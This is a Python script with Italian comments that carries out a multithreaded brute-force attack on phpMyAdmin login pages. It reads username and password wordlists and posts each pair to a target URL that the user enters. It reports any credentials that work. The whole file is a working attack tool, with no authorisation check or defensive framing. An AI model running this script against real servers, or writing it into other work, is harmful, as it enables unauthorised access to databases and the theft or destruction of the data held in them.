import requests
import threading
import queue

# Funzione per tentare il login
def attempt_login(target_url, username, password_queue, results):
    session = requests.Session()
    login_url = f"{target_url}/index.php"

    while not password_queue.empty():
        password = password_queue.get()
        payload = {
            'pma_username': username,
            'pma_password': password,
            'server': '1',
            'target': 'index.php'
        }
        
        try:
            response = session.post(login_url, data=payload)
            if "name=\"login_form\"" not in response.text:
                results.put((username, password))
                print(f"[+] Login successful: Username: {username}, Password: {password}")
                return
            else:
                print(f"[-] Failed: {username}:{password}")
        except requests.RequestException as e:
            print(f"[!] Error: {e}")
        
        password_queue.task_done()

# Funzione principale per configurare il brute force
def brute_force_phpmyadmin(target_url, usernames, password_list, num_threads=10):
    for username in usernames:
        password_queue = queue.Queue()
        results = queue.Queue()

        # Popola la coda con le password
        for password in password_list:
            password_queue.put(password)

        # Creazione dei thread
        threads = []
        for i in range(num_threads):
            thread = threading.Thread(target=attempt_login, args=(target_url, username, password_queue, results))
            thread.start()
            threads.append(thread)

        # Attende la terminazione di tutti i thread
        for thread in threads:
            thread.join()

        if results.empty():
            print(f"[-] No valid password found for username: {username}")

if __name__ == "__main__":
    target_url = input("Enter the target URL (e.g., http://example.com/phpmyadmin): ").strip()
    username_list_file = input("Enter the path to the username list file: ").strip()
    password_list_file = input("Enter the path to the password list file: ").strip()

    try:
        with open(username_list_file, 'r') as ufile:
            username_list = ufile.read().splitlines()

        with open(password_list_file, 'r') as pfile:
            password_list = pfile.read().splitlines()

        brute_force_phpmyadmin(target_url, username_list, password_list)
    except FileNotFoundError as fnf_error:
        print(f"Error: {fnf_error}")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")